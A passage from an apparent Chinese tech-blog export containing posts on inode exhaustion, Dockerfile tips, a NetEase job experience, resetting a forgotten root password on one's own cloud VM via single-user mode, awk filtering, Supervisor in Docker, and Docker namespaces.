1% /run/user/0 /dev/vdc 655360 655360 0 100% /mnt所以，该问题的根源是该磁盘的inode 被写满了导致的无法写入新文件。 那么,什么是inode呢？ 理解 inode维基百科对于inode的解释: inode是指在许多“类Unix文件系统”中的一种数据结构。 每个inode保存了文件系统中的一个文件系统对象（包括文件、目录、设备文件、socket、管道, 等等）的元信息数据，但不包括数据内容或者文件名。 什么是inode文件储存在硬盘上，硬盘的最小存储单位叫做”扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个”块”（block）。这种由多个扇区组成的”块”，是文件存取的最小单位。”块”的大小，最常见的是4KB，即连续八个 sector组成一个 block。文件数据都储存在”块”中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。 inode 的内容inode包含文件的元信息，具体来说有以下内容： 文件的字节数 文件拥有者的User ID 文件的Group ID 文件的读、写、执行权限 文件的时间戳，共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间。 链接数，即有多少文件名指向这个inode 文件数据block的位置 使用stat命令查看文件inode 信息 [root@centos7 mnt]# stat /etc/ssh/sshd_config File: ‘/etc/ssh/sshd_config’ Size: 4357 Blocks: 16 IO Block: 4096 regular file Device: fd01h/64769d Inode: 14100 Links: 1 Access: (0600/-rw-------) Uid: ( 0/ root) Gid: ( 0/ root) Access: 2017-10-17 18:54:25.539000000 +0800 Modify: 2017-04-12 14:17:31.081000000 +0800 Change: 2017-04-12 14:18:31.684000030 +0800 Birth: -重点来了！ inode会消耗硬盘空间，所以通常硬盘格式化的时候，操作系统自动将硬盘分成两个区域。一个是数据区，存放文件数据；另一个是inode区（inode table），存放inode所包含的信息。所以在排查此类问题的时要不仅仅是排查数据区是否被写满，还要查看inode 是否被写满。 每个inode节点的大小，一般是128字节或256字节。inode节点的总数，在格式化时就给定，一般是每1KB或每2KB就设置一个inode。假定在一块1GB的硬盘中，每个inode节点的大小为128字节，每1KB就设置一个inode，那么inode table的大小就会达到128MB，占整块硬盘的12.8%。查看每个硬盘分区的inode总数和已经使用的数量，可以使用df命令。 查看磁盘的 inode 大小，使用 dumpe2fs 查看 Inode size 的 value。 [root@centos7 mnt]# dumpe2fs -h /dev/vdc dumpe2fs 1.42.9 (28-Dec-2013) Filesystem volume name: &lt;none&gt; Last mounted on: /mnt Filesystem UUID: 315dfc9d-2326-4c2a-80b6-265ceca95ed3 Filesystem magic number: 0xEF53 Filesystem revision #: 1 (dynamic) Filesystem features: has_journal ext_attr resize_inode dir_index filetype needs_recovery extent 64bit flex_bg sparse_super large_file huge_file uninit_bg dir_nlink extra_isize Filesystem flags: signed_directory_hash Default mount options: user_xattr acl Filesystem state: clean Errors behavior: Continue Filesystem OS type: Linux Inode count: 655360 Block count: 2621440 Reserved block count: 131072 Free blocks: 2538303 Free inodes: 655349 First block: 0 Block size: 4096 Fragment size: 4096 Group descriptor size: 64 Reserved GDT blocks: 1024 Blocks per group: 32768 Fragments per group: 32768 Inodes per group: 8192 Inode blocks per group: 512 Flex block group size: 16 Filesystem created: Wed Oct 18 13:33:19 2017 Last mount time: Wed Oct 18 13:33:29 2017 Last write time: Wed Oct 18 13:33:29 2017 Mount count: 1 Maximum mount count: -1 Last checked: Wed Oct 18 13:33:19 2017 Check interval: 0 (&lt;none&gt;) Lifetime writes: 132 MB Reserved blocks uid: 0 (user root) Reserved blocks gid: 0 (group root) First inode: 11 Inode size: 256 # 每个inode节点的大小 Required extra isize: 28 Desired extra isize: 28 Journal inode: 8 Default directory hash: half_md4 Directory Hash Seed: c533050d-0c29-482c-bce4-c1dd7d5a5cf8 Journal backup: inode blocks Journal features: journal_64bit Journal size: 128M Journal length: 32768 Journal sequence: 0x00000010 Journal start: 28918inode号码每个inode都有一个号码，操作系统用inode号码来识别不同的文件。这里值得重复一遍，Unix/Linux系统内部不使用文件名，而使用inode号码来识别文件。对于系统来说，文件名只是inode号码便于识别的别称或者绰号。表面上，用户通过文件名，打开文件。实际上，系统内部这个过程分成三步：首先，系统找到这个文件名对应的inode号码；其次，通过inode号码，获取inode信息；最后，根据inode信息，找到文件数据所在的block，读出数据。使用ls -i命令，可以看到文件名对应的inode号码： [root@centos7 mnt]# ls -i /etc/ssh/sshd_config 14100 /etc/ssh/sshd_config更多内容请参考下面链接。 http://www.ruanyifeng.com/blog/2011/12/inode.html","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":" Dockfile 实践心得","slug":"Dockfile-实践心得","date":"2017-10-17T11:52:35.000Z","updated":"2021-02-26T06:05:29.246Z","comments":true,"path":"posts/53189.html","link":"","permalink":"https://awen.me/posts/53189.html","excerpt":"使用标签 给镜像打上标签，易读的镜像标签可以帮助了解镜像的功能。如 docker build -t=”ruby:2.0-onbuild”","text":"使用标签 给镜像打上标签，易读的镜像标签可以帮助了解镜像的功能。如 docker build -t=”ruby:2.0-onbuild” 谨慎选择基础镜像选择基础镜像时，尽量选择当前官方镜像中的镜像。不同镜像的大小不同，目前 Linux 镜像大小有如下关系： busybox &lt; debian &lt; centos &lt; Ubuntu 同时在构建自己的 Docker 镜像时，只安装必须使用的包。此外，相比 Ubuntu 镜像，更推荐使用debian镜像，因为它非常轻量级(目前大小是在 100M以下)，并且仍然是一个完整的发布版本。 FROM指令应该包含参数tag 如使用 FROM debian:jessie 而不是FROM debian。 充分利用换成Docker daemon 会顺序执行 Dockerfile 中的指令，而且一旦缓存失效，后续命令将不能使用缓存。为了有效的利用缓存，需要保证指令的连续性，尽量将所有 Dockerfile 文件中相同不分都放在前面，而将不同的部分放在后面。 正确使用ADD 与 COPY 指令尽管 ADD 和COPY 用法和作用很相近，但是 COPY 仍是首选。COPY 相对于 ADD 而言，功能更简单。 RUN 指令为了使用 Dockerfile 易读、易理解和可维护，在使用较长的 RUN 指令可以使用反斜杠 \\ 分割多行。大部分使用 RUN 指令的场景是运行 apt-get 命令，在该场景下请注意一下几点: 不要在一行中单独使用 RUN apt-get update，当软件源更新以后，这样会引起缓存问题，导致 RUN apt-get install 指令失败。所以 RUN apt-get update 和 apt-get install 应该写在同一行，如: apt-get update &amp;&amp; apt-get install xxx 避免使用 RUN apt-get upgrade 和 RUN apt-get dist-upgrade。因为无特权容器中会导致一些包更新失败。 不要害怕镜像的层数过多，我们可以在任一一层创建一个容器。因此，不要将所有的容器写在一个 RUN 中。 CMD 和 ENTRYPOINTCMD 和 ENTRYPOINT 指令指定了容器运行的默认命令。推荐结合使用，使用 exec 格式的 ENTRYPOINT 指令设置固定的默认命令和参数，然后使用 CMD 指令设置可变的参数。 不要在docker中做端口映射例如 EXPOSE 80:8080而是暴露端口，另外做映射 EXPOSE 80使用 Dockerfile 共享 Docker镜像若要共享镜像，只需要共享 Dockerfile 文件即可。共享 Dockerfile文件具有以下优点: 可以加入版本控制，这样便于追踪文件的变化和回滚错误 通过 Dockerfile 文件，可以清楚镜像构建的过程 使用 Dockerfile 文件构建的镜像具体确定性 以上由awen 整理，来源《docker容器与容器云》","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"网易工作体验","slug":"网易工作体验","date":"2017-10-15T02:41:10.000Z","updated":"2021-02-26T06:05:29.353Z","comments":true,"path":"posts/63408.html","link":"","permalink":"https://awen.me/posts/63408.html","excerpt":"入职网易杭州研究院工作时间差不多一个月了，中间夹着一个国庆，来说说在“猪厂”的工作体验吧。","text":"入职网易杭州研究院工作时间差不多一个月了，中间夹着一个国庆，来说说在“猪厂”的工作体验吧。 经历了一轮电话面试（部门主管），初试（部门主管），复试（部门总监），HR 面到9月初收到 offer，确认后填写相关资料等待审核。offer 写着是杭州朗和科技有限公司，我一开始还以为不会是网易给我签了个外包公司吧。去企查查和工商局查了下发现公司注册人是丁磊才放下心。 这里要说下，网易招聘要的信息可是真的不是一般的全，从毕业到现在分别做了什么，比如我有2个月我第一家公司离职后我弟车祸2个月在医院照顾他没上班，这都要了解清楚。在一般公司这个就没问过。 另外公司安排体检说我尿隐血阳性+3让我去三甲医院复检，还好复检没大问题。 9月19号，从老东家办理完入职手续。 9月20号入职，签订劳动合同，到部门报道，领取电脑、办公用品等，熟悉公司各种流程制度。 然后熟悉了下工作内容，就直接开始干活了。 入职第一天中午，跟着部门新同事去食堂吃饭，这中间有个小插曲，早上报道的时候去食堂吃了个早饭，当天下着雨，网易门口有个大水池，邻着大门和 C 座周围没有任何的防护或提醒标记，下了雨地面和水池的颜色几乎一样，不熟悉地理环境的我一脚买进了水池，着实的尴尬，然后穿着湿鞋呆了一天。大写的囧！！ 下面开始正式进入我的体验总结了！ 食堂网易的食堂是出了名的，一天五顿免费吃，早上有包子、面包、水煮蛋、茶叶蛋、咸鸭蛋、玉米、花卷、稀饭、小菜等等可以选择。 中午一楼和二楼都有食堂，不过中午和晚上吃饭人超级多，要排队，不同的窗口菜品不一样，很多热门窗口排队的人都可以绕食堂一圈。 一天三顿都在食堂吃，以一顿饭20块钱的标准计算，伙食还是非常不错的，一个月大概能省一千多伙食费。 工作环境这个和一般创业公司的工作环境差不了多少，都是开放式的办公空间，各个部门的人都互相挨着的。目前来看，领导和同事们都很 nice。 健身房食堂二楼的健身房超级大，不过目前我一次都没去锻炼过。😶 上下班由于我住西溪这边，暂时因为房租没到期等原因没办法搬滨江去，但是也是知道网易有班车的，我就先看看能不能行，实在不行再说嘛！班车从古墩路每天早上7点50有2个班车可以选择，从紫金隧道到滨江大概也就8点半就到公司了。所以上下班通勤时间相比以前15分钟就到了确实要远很多，不过也还能接受。上了大半个月班通勤问题上还是很好的解决了。 加班互联网公司没有几个不加班的。我们部门平时都要到8点或9点才走，平时值班要到11点，周末有值班。 试用期这个我也是第一次遇到试用期要6个月的，不过薪水不像一些创业公司试用期发80%之类的，全额发放，所以也就无所谓了。 社保公积金网易的社保是按工资全额缴纳的，公积金也是全额缴纳，最高标准。这相比较一些创业公司按最低标准缴纳差距还是很大的。 活动平时中午或晚上园区有各种活动促销，俗称“工资回收计划”，哈哈哈！ 网易和农夫山泉的活动 其他来网易之前就听说网易是出了名的只要 985、211、一本类的院校学生，那首歌不是这样唱的吗？“985、211 一本类的院校免筛选、统统免筛选 ”，我这个学校都不入流的而且大学还是学的文科的学渣能进来网易我自己都感到惊讶！主管也和我说了，我是走特殊渠道进来的，当时也担心卡学历进不来，不过主管说我工作经历丰富，才要了我。 我一个文科生（当时脑子进了水，选错了个文科专业，主要还是年轻见识少，从村里出来一切看到的一切都是新的，也没机会见世面，哪里能看到未来的趋势，真的是见识决定命运）毕业到现在转行的艰辛历程就不说了，现在出去找工作我都羞于和别人说我大学学的专业，都说我是学计算机的，走了很多弯路，一路过来非常不顺利，几年间我几乎相当于重读了一个大学计算机专业的课程，业余时间参加各种培训，学习 CCIE、RHCE、JAVA、Python、运维相关技术参加各种与行业相关的线上和线下培训，老实说花了很多时间和经历还有金钱，自己底子薄想在这行发展下去，一切都得重头来，不然始终只能坐些非常基础的工作。在当今中国社会，好的学校毕业的机会还是比一般学校的多很多的。起点就高很多了，但是也并不是说学校不好就没机会了，学历很重要！但是仅仅有学历还是不够的，自身的努力和不断的学习和适应能力也是非常重要的。能力够，还是能有很多机会的。但是学历够，机会更大，能少走很多弯路!","categories":[],"tags":[]},{"title":"网易云破解服务器密码","slug":"网易云破解服务器密码","date":"2017-10-13T07:36:56.000Z","updated":"2021-02-26T06:05:29.352Z","comments":true,"path":"posts/48510.html","link":"","permalink":"https://awen.me/posts/48510.html","excerpt":"目前网易云的操作系统都是直接安装时使用 SSH KEY 验证登陆，这样的好处就是比用密码登陆安全，避免了被不法分子暴力破解密码，但是也带来了一些问题，就是有些用户进了系统后忘记设置 root 密码的话假如遇到以下情况就比较尴尬了： 系统内设置了防火墙，把自己锁在外面了，比如禁止了 ssh 端口； 挂载磁盘把配置写到了/etc/fstab 中，卸载磁盘没有删除配置；","text":"目前网易云的操作系统都是直接安装时使用 SSH KEY 验证登陆，这样的好处就是比用密码登陆安全，避免了被不法分子暴力破解密码，但是也带来了一些问题，就是有些用户进了系统后忘记设置 root 密码的话假如遇到以下情况就比较尴尬了： 系统内设置了防火墙，把自己锁在外面了，比如禁止了 ssh 端口； 挂载磁盘把配置写到了/etc/fstab 中，卸载磁盘没有删除配置； 都会导致必须通过控制台 VNC 进行登陆系统后修改配置，但是假设用户忘记设置 root 密码或是遗忘了密码就需要进入单用户模式进行密码的重置了。 网易云的系统破解和网上的不太一样，以下是常见的几种操作系统的密码破解方式 centos 71.控制台连接 VNC 2.假设你现在已经进不去了，点击右上角的send CtrlAltDel 3.重启后按 e 键修改引导内容 修改前 修改后 4.按 ctrl+x 进入单用户模式依次输入如下命令： # chroot /sysroot/ # touch /.autorelabel # passwd root 5.进行root密码修改,然后返回控制台重启 debian 系统破解1.在控制台找到对应的服务器，点击 VNC 2.假设你现在已经进不去了，点击右上角的send CtrlAltDel 3.重启后，在grub选项菜单’Debian GNU/Linux’，按e进入编辑模式 4.编辑kernel那行最后面的 内容从 ro 到 quit 都删掉， 改成 rw single init=/bin/bash，按crtl+x 执行重启 5.系统加载完毕后进入单用户模式 6.然后执行 # passwd root 7.修改完密码 然后在控制台点击重启。 Ubuntu 系统破解1.同样的从 VNC 进去 重启，按 shift 键盘，然后按e 键进入引导修改成如下图所示，然后按 crtl+x 进入单用户模式 2.然后修改密码 3.然后点击控制台的重启按钮 4.重启后登陆","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"awk 获取指定列的内容进行判断输出","slug":"awk-获取指定列的内容进行判断输出","date":"2017-10-12T14:19:49.000Z","updated":"2021-02-26T06:05:29.269Z","comments":true,"path":"posts/43345.html","link":"","permalink":"https://awen.me/posts/43345.html","excerpt":"","text":"现在有一些日志，要获取倒数第二行的内容，并且判断其值是否为 0，如果为0则输出对应的行。 [root@centos ~]# awk -F &apos;,&apos; &apos;{if($7==0) print $0}&apos; test.txt 上海, 上海, 中国移动, 0.000000 0.000000, 2017-10-10 16:45:14, http://upod-dl.fm/m4a/57c555ed7cb8912ec41015b0_5820095_24.m4a?sign=376ed5bda7ca56c990aed71e107498c0&amp;t=59dd3192, 0, 404或者 awk -F &apos;,&apos; &apos;{ if($(NF-1)==0) print $0}&apos; test.txt其中 NF 表示最后一行，NF-1 表示倒数第二行；","categories":[],"tags":[{"name":"awk","slug":"awk","permalink":"https://awen.me/tags/awk/"}]},{"title":"使用Supervisor管理进程","slug":"使用Supervisor管理进程","date":"2017-10-12T01:24:17.000Z","updated":"2021-02-26T06:05:29.308Z","comments":true,"path":"posts/33217.html","link":"","permalink":"https://awen.me/posts/33217.html","excerpt":"Docker 容器在启动的时候开启单个进程，比如，一个 ssh 或者 apache 的 daemon 服务。但我们经常需要在一个机器上开启多个服务，这可以有很多方法，最简单的就是把多个启动命令放到一个启动脚本里面，启动的时候直接启动这个脚本，另外就是安装进程管理工具。 使用进程管理工具 supervisor 来管理容器中的多个进程。使用 Supervisor 可以更好的控制、管理、重启我们希望运行的进程。","text":"Docker 容器在启动的时候开启单个进程，比如，一个 ssh 或者 apache 的 daemon 服务。但我们经常需要在一个机器上开启多个服务，这可以有很多方法，最简单的就是把多个启动命令放到一个启动脚本里面，启动的时候直接启动这个脚本，另外就是安装进程管理工具。 使用进程管理工具 supervisor 来管理容器中的多个进程。使用 Supervisor 可以更好的控制、管理、重启我们希望运行的进程。 什么是 supervisorSupervisor (http://supervisord.org) 是一个用 Python 写的进程管理工具，可以很方便的用来启动、重启、关闭进程（不仅仅是 Python 进程）。除了对单个进程的控制，还可以同时启动、关闭多个进程，比如很不幸的服务器出问题导致所有应用程序都被杀死，此时可以用 supervisor 同时启动所有应用程序而不是一个一个地敲命令启动。 安装yum -y install epel-release yum -y update yum -y install supervisor或 pip install supervisor配置文件Supervisor 相当强大，提供了很丰富的功能，不过我们可能只需要用到其中一小部分。安装完成之后，可以编写配置文件，来满足自己的需求。为了方便，我们把配置分成两部分：supervisord（supervisor 是一个 C/S 模型的程序，这是 server 端，对应的有 client 端：supervisorctl）和应用程序（即我们要管理的程序）。首先来看 supervisord 的配置文件。安装完 supervisor 之后，可以运行echo_supervisord_conf 命令输出默认的配置项，也可以重定向到一个配置文件里： echo_supervisord_conf &gt; /etc/supervisord.conf 去除里面大部分注释和“不相关”的部分，我们可以先看这些配置： [unix_http_server] file=/tmp/supervisor.sock ; UNIX socket 文件，supervisorctl 会使用 ;chmod=0700 ; socket 文件的 mode，默认是 0700 ;chown=nobody:nogroup ; socket 文件的 owner，格式： uid:gid ;[inet_http_server] ; HTTP 服务器，提供 web 管理界面 ;port=127.0.0.1:9001 ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性 ;username=user ; 登录管理后台的用户名 ;password=123 ; 登录管理后台的密码 [supervisord] logfile=/tmp/supervisord.log ; 日志文件，默认是 $CWD/supervisord.log logfile_maxbytes=50MB ; 日志文件大小，超出会 rotate，默认 50MB logfile_backups=10 ; 日志文件保留备份数量默认 10 loglevel=info ; 日志级别，默认 info，其它: debug,warn,trace pidfile=/tmp/supervisord.pid ; pid 文件 nodaemon=false ; 是否在前台启动，默认是 false，即以 daemon 的方式启动 minfds=1024 ; 可以打开的文件描述符的最小值，默认 1024 minprocs=200 ; 可以打开的进程数的最小值，默认 200 ; the below section must remain in the config file for RPC ; (supervisorctl/web interface) to work, additional interfaces may be ; added by defining them in separate rpcinterface: sections [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisorctl] serverurl=unix:///tmp/supervisor.sock ; 通过 UNIX socket 连接 supervisord，路径与 unix_http_server 部分的 file 一致 ;serverurl=http://127.0.0.1:9001 ; 通过 HTTP 的方式连接 supervisord ; 包含其他的配置文件 [include] files = relative/directory/*.ini ; 可以是 *.conf 或 *.ini我们把上面这部分配置保存到 /etc/supervisord.conf（或其他任意有权限访问的文件），然后启动 supervisord（通过 -c 选项指定配置文件路径，如果不指定会按照这个顺序查找配置文件： $CWD/supervisord.conf, $CWD/etc/supervisord.conf, /etc/supervisord.conf）： supervisord -c /etc/supervisord.conf查看 supervisord 是否在运行： ps aux | grep supervisord program 配置上面我们已经把 supervisrod 运行起来了，现在可以添加我们要管理的进程的配置文件。可以把所有配置项都写到 supervisord.conf 文件里，但并不推荐这样做，而是通过 include 的方式把不同的程序（组）写到不同的配置文件里。为了举例，我们新建一个目录 /etc/supervisor/ 用于存放这些配置文件，相应的，把 /etc/supervisord.conf 里 include 部分的的配置修改一下： [include] files = /etc/supervisor/*.conf 假设有个用 Python 和 Flask 框架编写的用户中心系统，取名 usercenter，用 gunicorn (http://gunicorn.org/) 做 web 服务器。项目代码位于 /home/leon/projects/usercenter，gunicorn 配置文件为 gunicorn.py，WSGI callable 是 wsgi.py 里的 app 属性。所以直接在命令行启动的方式可能是这样的： cd /home/leon/projects/usercenter gunicorn -c gunicorn.py wsgi:app现在编写一份配置文件来管理这个进程（需要注意：用 supervisord 管理时，gunicorn 的 daemon 选项需要设置为 False）： [program:usercenter] directory = /home/leon/projects/usercenter ; 程序的启动目录 command = gunicorn -c gunicorn.py wsgi:app ; 启动命令，可以看出与手动在命令行启动的命令是一样的 autostart = true ; 在 supervisord 启动的时候也自动启动 startsecs = 5 ; 启动 5 秒后没有异常退出，就当作已经正常启动了 autorestart = true ; 程序异常退出后自动重启 startretries = 3 ; 启动失败自动重试次数，默认是 3 user = leon ; 用哪个用户启动 redirect_stderr = true ; 把 stderr 重定向到 stdout，默认 false stdout_logfile_maxbytes = 20MB ; stdout 日志文件大小，默认 50MB stdout_logfile_backups = 20 ; stdout 日志文件备份数 ; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件） stdout_logfile = /data/logs/usercenter_stdout.log ; 可以通过 environment 来添加需要的环境变量，一种常见的用法是修改 PYTHONPATH ; environment=PYTHONPATH=$PYTHONPATH:/path/to/somewhere一份配置文件至少需要一个 [program:x] 部分的配置，来告诉 supervisord 需要管理那个进程。[program:x] 语法中的 x 表示 program name，会在客户端（supervisorctl 或 web 界面）显示，在 supervisorctl 中通过这个值来对程序进行 start、restart、stop 等操作。使用 supervisorctlSupervisorctl 是 supervisord 的一个命令行客户端工具，启动时需要指定与 supervisord 使用同一份配置文件，否则与 supervisord 一样按照顺序查找配置文件。 supervisorctl -c /etc/supervisord.conf上面这个命令会进入 supervisorctl 的 shell 界面，然后可以执行不同的命令了： &gt; status # 查看程序状态 &gt; stop usercenter # 关闭 usercenter 程序 &gt; start usercenter # 启动 usercenter 程序 &gt; restart usercenter # 重启 usercenter 程序 &gt; reread ＃ 读取有更新（增加）的配置文件，不会启动新添加的程序 &gt; update ＃ 重启配置文件修改过的程序上面这些命令都有相应的输出，除了进入 supervisorctl 的 shell 界面，也可以直接在 bash 终端运行： $ supervisorctl status $ supervisorctl stop usercenter $ supervisorctl start usercenter $ supervisorctl restart usercenter $ supervisorctl reread $ supervisorctl update Dockerfile 配置FROM centos LABEL maintainer &quot;awen Email: &lt;hi@awen.me&gt;&quot; WORKDIR /opt/ COPY CentOS7-Base-163.repo /etc/yum.repos.d/CentOS-Base.repo ENV NGINX_V=1.13.5 \\ OPENSSL_V=1.0.2l \\ PCRE_V=8.41 \\ ZLIB_V=1.2.11 RUN yum -y install openssh-server openssl gcc gcc-c++ pcre-devel openssl-devel zlib-devel wget epel-release python-setuptools rsync make perl tar net-tools \\ &amp;&amp; yum -y update \\ &amp;&amp; yum -y install supervisor \\ &amp;&amp; wget -c -4 https://nginx.org/download/nginx-$NGINX_V.tar.gz \\ &amp;&amp; wget -c -4 https://www.openssl.org/source/openssl-$OPENSSL_V.tar.gz \\ &amp;&amp; wget -c -4 ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-$PCRE_V.tar.gz \\ &amp;&amp; wget -c -4 http://zlib.net/zlib-$ZLIB_V.tar.gz \\ &amp;&amp; groupadd -r www &amp;&amp; useradd -r -g www www \\ &amp;&amp; tar zxvf zlib-$ZLIB_V.tar.gz \\ &amp;&amp; cd zlib-$ZLIB_V \\ &amp;&amp; ./configure \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; cd /opt \\ &amp;&amp; tar zxvf pcre-$PCRE_V.tar.gz \\ &amp;&amp; cd pcre-$PCRE_V \\ &amp;&amp; ./configure \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; cd /opt \\ &amp;&amp; tar zxvf openssl-$OPENSSL_V.tar.gz \\ &amp;&amp; tar zxvf nginx-$NGINX_V.tar.gz \\ &amp;&amp; cd nginx-$NGINX_V \\ &amp;&amp; ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=/opt/pcre-$PCRE_V --with-http_ssl_module --with-zlib=/opt/zlib-$ZLIB_V --with-openssl=/opt/openssl-$OPENSSL_V --with-http_v2_module --with-http_ssl_module \\ &amp;&amp; make \\ &amp;&amp; make install \\ &amp;&amp; rm -rf /opt/* \\ &amp;&amp; yum clean all \\ &amp;&amp; rm -rf /root/*.cfg RUN mkdir -p /usr/local/nginx/conf/vhost /var/log/wwwlogs/ /www/ /var/run/sshd /etc/supervisor/conf.d/ /usr/local/nginx/ssl \\ &amp;&amp; ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key -N &apos;&apos; \\ &amp;&amp; chown -R www:www /var/log/wwwlogs/ \\ &amp;&amp; ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key -N &apos;&apos; \\ &amp;&amp; ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N &apos;&apos; \\ &amp;&amp; sed -i &quot;s/PasswordAuthentication yes/PasswordAuthentication no/g&quot; /etc/ssh/sshd_config \\ &amp;&amp; sed -i &quot;s/#Port 22/Port 65422/g&quot; /etc/ssh/sshd_config \\ &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/localtime COPY ssl/* /usr/local/nginx/ssl/ COPY vhost/* /usr/local/nginx/conf/vhost/ COPY nginx.conf /usr/local/nginx/conf/ COPY ssh/* /root/.ssh/ COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf VOLUME [&quot;/www&quot;,&quot;/var/log/wwwlogs&quot;,&quot;/usr/local/nginx/ssl&quot;,&quot;/usr/local/nginx/conf/vhost&quot;] EXPOSE 65422 80 443 HEALTHCHECK CMD curl -fs http://localhost/ || exit 1 CMD [&quot;/usr/bin/supervisord&quot;,&quot;-c&quot;,&quot;/etc/supervisor/conf.d/supervisord.conf&quot;]配置文件 [supervisord] nodaemon=true [program:sshd] command=/usr/sbin/sshd -D [program:nginx] command=/usr/local/nginx/sbin/nginx stopsignal=QUIT 运行后查看进程 # docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 264aecfceac8 500 &quot;/usr/bin/supervisord&quot; 3 seconds ago Up 2 seconds (health: starting) 0.0.0.0:80-&gt;80/tcp, 0.0.0.0:443-&gt;443/tcp, 0.0.0.0:65423-&gt;65422/tcp blog查看 log 信息 # docker logs 264 2017-10-12 05:20:29,984 CRIT Supervisor running as root (no user in config file) 2017-10-12 05:20:29,987 INFO supervisord started with pid 1 2017-10-12 05:20:30,989 INFO spawned: &apos;nginx&apos; with pid 7 2017-10-12 05:20:30,996 INFO spawned: &apos;sshd&apos; with pid 8 2017-10-12 05:20:32,009 INFO success: nginx entered RUNNING state, process has stayed up for &gt; than 1 seconds (startsecs) 2017-10-12 05:20:32,010 INFO success: sshd entered RUNNING state, process has stayed up for &gt; than 1 seconds (startsecs)","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"Docker 的底层实现","slug":"Docker-的底层实现","date":"2017-10-11T11:14:11.000Z","updated":"2021-02-26T06:05:29.245Z","comments":true,"path":"posts/35400.html","link":"","permalink":"https://awen.me/posts/35400.html","excerpt":"Docker 底层的核心技术包括 Linux 上的名字空间（Namespaces）、控制组（Control groups）、Union 文件系统（Union file systems）和容器格式（Container format）。","text":"Docker 底层的核心技术包括 Linux 上的名字空间（Namespaces）、控制组（Control groups）、Union 文件系统（Union file systems）和容器格式（Container format）。 我们知道，传统的虚拟机通过在宿主主机中运行 hypervisor 来模拟一整套完整的硬件环境提供给虚拟机的操作系统。虚拟机系统看到的环境是可限制的，也是彼此隔离的。 这种直接的做法实现了对资源最完整的封装，但很多时候往往意味着系统资源的浪费。 例如，以宿主机和虚拟机系统都为 Linux 系统为例，虚拟机中运行的应用其实可以利用宿主机系统中的运行环境。 我们知道，在操作系统中，包括内核、文件系统、网络、PID、UID、IPC、内存、硬盘、CPU 等等，所有的资源都是应用进程直接共享的。 要想实现虚拟化，除了要实现对内存、CPU、网络IO、硬盘IO、存储空间等的限制外，还要实现文件系统、网络、PID、UID、IPC等等的相互隔离。 前者相对容易实现一些，后者则需要宿主机系统的深入支持。 随着 Linux 系统对于名字空间功能的完善实现，程序员已经可以实现上面的所有需求，让某些进程在彼此隔离的名字空间中运行。大家虽然都共用一个内核和某些运行时环境（例如一些系统命令和系统库），但是彼此却看不到，都以为系统中只有自己的存在。这种机制就是容器（Container），利用名字空间来做权限的隔离控制，利用 cgroups 来做资源分配。 基本架构Docker 采用了 C/S架构，包括客户端和服务端。 Docker daemon 作为服务端接受来自客户的请求，并处理这些请求（创建、运行、分发容器）。 客户端和服务端既可以运行在一个机器上，也可通过 socket 或者 RESTful API 来进行通信。 Docker daemon 一般在宿主主机后台运行，等待接收来自客户端的消息。 Docker 客户端则为用户提供一系列可执行命令，用户用这些命令实现跟 Docker daemon 交互。 名字空间名字空间是 Linux 内核一个强大的特性。每个容器都有自己单独的名字空间，运行在其中的应用都像是在独立的操作系统中运行一样。名字空间保证了容器之间彼此互不影响。 pid 名字空间不同用户的进程就是通过 pid 名字空间隔离开的，且不同名字空间中可以有相同 pid。所有的 LXC 进程在 Docker 中的父进程为Docker进程，每个 LXC 进程具有不同的名字空间。同时由于允许嵌套，因此可以很方便的实现嵌套的 Docker 容器。 net 名字空间有了 pid 名字空间, 每个名字空间中的 pid 能够相互隔离，但是网络端口还是共享 host 的端口。网络隔离是通过 net 名字空间实现的， 每个 net 名字空间有独立的 网络设备, IP 地址, 路由表, /proc/net 目录。这样每个容器的网络就能隔离开来。Docker 默认采用 veth 的方式，将容器中的虚拟网卡同 host 上的一 个Docker 网桥 docker0 连接在一起。 ipc 名字空间容器中进程交互还是采用了 Linux 常见的进程间交互方法(interprocess communication - IPC), 包括信号量、消息队列和共享内存等。然而同 VM 不同的是，容器的进程间交互实际上还是 host 上具有相同 pid 名字空间中的进程间交互，因此需要在 IPC 资源申请时加入名字空间信息，每个 IPC 资源有一个唯一的 32 位 id。 mnt 名字空间类似 chroot，将一个进程放到一个特定的目录执行。mnt 名字空间允许不同名字空间的进程看到的文件结构不同，这样每个名字空间 中的进程所看到的文件目录就被隔离开了。同 chroot 不同，每个名字空间中的容器在 /proc/mounts 的信息只包含所在名字空间的 mount point。 uts 名字空间UTS(“UNIX Time-sharing System”) 名字空间允许每个容器拥有独立的 hostname 和 domain name, 使其在网络上可以被视作一个独立的节点而非 主机上的一个进程。 user 名字空间每个容器可以有不同的用户和组 id, 也就是说可以在容器内用容器内部的用户执行程序而非主机上的用户。 控制组控制组（cgroups）是 Linux 